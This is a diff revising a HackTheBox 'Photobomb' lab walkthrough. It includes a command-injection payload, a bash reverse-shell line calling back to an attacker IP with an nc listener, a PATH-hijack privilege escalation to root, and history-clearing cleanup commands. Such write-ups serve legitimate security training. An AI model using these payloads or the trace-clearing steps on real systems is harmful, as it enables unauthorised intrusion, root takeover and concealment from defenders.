@@ -1,244 +1,151 @@
-# 📸 HTB Photobomb – Walkthrough (Easy Linux)
+# HTB – Photobomb (Linux, Easy)
 
-## 01 – Enumeration
-
-### 🔍 Nmap Scan
-
-**Command:**
-
-```bash
-nmap -sC -sV -oA nmap/photobomb 10.10.11.182
-```
-
-**Result:**
-
-- `22/tcp` – OpenSSH 8.9p1 (Ubuntu 3ubuntu0.1)
-    
-- `80/tcp` – nginx 1.18.0 (Ubuntu)
-    
-- Virtual host: `photobomb.htb`
-    
-
-**Action:** Add the hostname to `/etc/hosts`
-
-```bash
-sudo nano /etc/hosts
-```
-
-Add this line:
-
-```
-10.10.11.182    photobomb.htb
-```
-
-### 🧠 Key Findings
-
-- SSH is open – potential access vector after exploitation.
-    
-- The web server serves content for `photobomb.htb`, not just the IP.
-    
+## Table of Contents
+- General Info
+- Objectives
+- Enumeration
+- Exploitation
+- Initial Shell
+- Privilege Escalation
+- Post-Exploitation Proof
+- Cleanup
+- Key Takeaways
+- Conclusion
 
 ---
 
-## 02 – Initial Access
-
-### 🔐 Discovered Credentials
-
-While viewing the page source (`Ctrl+U`), a script tag references `photobomb.js`. Inside the JS code:
-
-```javascript
-// Jameson: pre-populate creds for tech support...
-document.getElementsByClassName('creds')[0].setAttribute(
-  'href',
-  'http://pH0t0:b0Mb!@photobomb.htb/printer'
-);
-```
-
-**Credentials:**
-
-- Username: `pH0t0`
-    
-- Password: `b0Mb!`
-    
-
-**Login URL:**
-
-```
-http://photobomb.htb/printer
-```
-
-### ✅ Access Confirmed
-
-This endpoint is protected via **Basic Auth**. After logging in, it reveals a photo download panel with options to:
-
-- Set dimensions (e.g., 30x20)
-    
-- Select file type (e.g., JPG, PNG)
-    
-- Submit download
-    
+## General Info
+- **Machine name:** Photobomb  
+- **Platform:** HackTheBox  
+- **OS:** Linux (Ubuntu)  
+- **Difficulty:** Easy  
+- **Type:** Boot2Root (goal: user + root)
 
 ---
 
-### 🧠 Observations
-
-- The image download triggers backend processing (likely ImageMagick or similar)
-    
-- Parameters in the POST request may be vulnerable to injection
-    
-
-**Next:** Use **Burp Suite** to intercept and test for vulnerabilities in form parameters.
+## Objectives
+- Identify entry points through enumeration  
+- Exploit vulnerable web functionality to gain a foothold  
+- Escalate privileges to root via misconfigured sudo script  
 
 ---
 
-## 03 – Exploitation: Remote Code Execution (RCE)
+## Enumeration
 
-### 🔎 Testing with Burp
+### Nmap Scan
+Command: nmap -sC -sV -oA nmap/photobomb 10.10.11.182  
+Result:  
+- 22/tcp – OpenSSH 8.9p1 (Ubuntu 3ubuntu0.1)  
+- 80/tcp – nginx 1.18.0 (Ubuntu)  
 
-When intercepting the request in Burp, we noticed:
+### Virtual Host
+The web server expects hostname photobomb.htb.  
+Added entry in /etc/hosts:  
+10.10.11.182    photobomb.htb  
 
-```
-POST /printer HTTP/1.1
-Host: photobomb.htb
-Authorization: Basic cEgwdDBiOmIwTWIh
-Content-Type: application/x-www-form-urlencoded
-
-photo=1337&filetype=jpg;id
-```
-
-- Adding `;id` to `filetype` executed system command `id`
-    
-
-➡️ **This confirms a command injection vulnerability.**
+*Figure 1 – Nmap scan results*  
+*Figure 2 – /etc/hosts modification*
 
 ---
 
-### 🔙 Gaining Reverse Shell
+## Exploitation
 
-**Reverse shell payload (Bash):**
+### Discovered Credentials
+Viewing page source (view-source:http://photobomb.htb) revealed photobomb.js.  
+Inside the code, static credentials were present:  
+- Username: pH0t0  
+- Password: b0Mb!  
+Login URL: http://photobomb.htb/printer  
 
-```bash
-filetype=jpg;bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
-```
+*Figure 3 – Credentials exposed in photobomb.js*
 
-Start listener on attacker machine:
+### Command Injection
+POST request to /printer vulnerable to command injection in parameter filetype.  
+Example payload: filetype=jpg;id  
+Response confirmed execution of system command id.  
 
-```bash
-nc -lvnp 4444
-```
+*Figure 4 – Burp Suite request showing command injection*
 
-After submission, a shell is received as user `wizard`:
+### Reverse Shell
+Payload: filetype=jpg;bash -i >& /dev/tcp/10.10.14.2/4444 0>&1  
+Listener: nc -lvnp 4444  
+Result: reverse shell as user wizard.  
 
-```bash
-wizard@photobomb:~/photobomb$
-```
-
-To stabilize the shell:
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-```
+*Figure 5 – Reverse shell established as wizard*
 
 ---
 
-## 04 – Privilege Escalation
+## Initial Shell
+Stabilized with:  
+python3 -c 'import pty; pty.spawn("/bin/bash")'  
+export TERM=xterm  
 
-### 🔍 Sudo Permissions
-
-```bash
-sudo -l
-```
-
-```
-User wizard may run the following command:
-  (root) SETENV: NOPASSWD: /opt/cleanup.sh
-```
-
-➡️ We can run `/opt/cleanup.sh` as root with custom environment variables.
-
-### 🔍 Script Analysis
-
-```bash
-cat /opt/cleanup.sh
-```
-
-```bash
-#!/bin/bash
-. /opt/.bashrc
-cd /home/wizard/photobomb
-if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]; then
-  /bin/cat log/photobomb.log > log/photobomb.log.old
-  /usr/bin/truncate -s0 log/photobomb.log
-fi
-find source_images -type f -name '*.jpg' -exec chown root:root {} \;
-```
-
-**Notice:** The script uses `find` without full path. We can hijack it via `$PATH`.
+*Figure 6 – Stabilized wizard shell*
 
 ---
 
-### 🚀 Exploiting PATH Hijack
+## Privilege Escalation
 
-1. Create malicious `find` in `/dev/shm`
-    
+### Sudo Permissions
+Checked with: sudo -l  
+Output: (root) SETENV: NOPASSWD: /opt/cleanup.sh  
 
-```bash
-cd /dev/shm
-echo -e '#!/bin/bash\nbash' > find
-chmod +x find
-```
+*Figure 7 – Sudo permissions for cleanup.sh*
 
-2. Run cleanup script with manipulated PATH:
-    
+### Script Analysis
+Content of /opt/cleanup.sh:  
+#!/bin/bash  
+. /opt/.bashrc  
+cd /home/wizard/photobomb  
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]; then  
+  /bin/cat log/photobomb.log > log/photobomb.log.old  
+  /usr/bin/truncate -s0 log/photobomb.log  
+fi  
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;  
 
-```bash
-sudo PATH=/dev/shm:$PATH /opt/cleanup.sh
-```
+Observation: find is called without absolute path → vulnerable to $PATH hijack.  
 
-➡️ Root shell gained ✅
+### Exploiting PATH Hijack
+Steps:  
+cd /dev/shm  
+echo -e '#!/bin/bash\nbash' > find  
+chmod +x find  
+sudo PATH=/dev/shm:$PATH /opt/cleanup.sh  
+Result: root shell obtained.  
 
-```bash
-root@photobomb:/home/wizard/photobomb#
-```
-
----
-
-## 🏁 Flags
-
-### 🧑‍💻 User Flag
-
-```bash
-cat /home/wizard/user.txt
-```
-
-```
-HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
-```
-
-### 👑 Root Flag
-
-```bash
-cat /root/root.txt
-```
-
-```
-HTB{yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy}
-```
+*Figure 8 – Root shell obtained via PATH hijack*
 
 ---
 
-## ✅ Summary
+## Post-Exploitation Proof
+User flag: cat /home/wizard/user.txt  
+Root flag: cat /root/root.txt  
 
-- Initial foothold via credentials found in JS
-    
-- Command injection in `filetype` param → reverse shell
-    
-- `sudo` rights on `cleanup.sh` using `find` → PATH hijack → root
-    
-- Optional: Advanced method with `enable -n` and `BASH_ENV`
-    
+*Figure 9 – User flag*  
+*Figure 10 – Root flag*
 
 ---
 
-🎯 **Machine pwned.**
+## Cleanup
+rm -f /dev/shm/find  
+history -c  
+exit  
+
+---
+
+## Key Takeaways
+- Hidden credentials in JS can expose login details.  
+- Command injection in poorly validated parameters leads directly to RCE.  
+- Always enumerate sudo -l for privilege escalation opportunities.  
+- $PATH hijacking is a common and dangerous misconfiguration.  
+
+---
+
+## Conclusion
+The Photobomb machine demonstrated a straightforward attack chain:  
+- Enumeration revealed a vhost and JS credentials.  
+- Exploitation via command injection granted shell access as wizard.  
+- Privilege escalation through sudo misconfiguration led to root.  
+- Both user and root flags were successfully retrieved.  
+
+This lab emphasizes the importance of code review, secure credential handling, and proper path usage in privileged scripts.
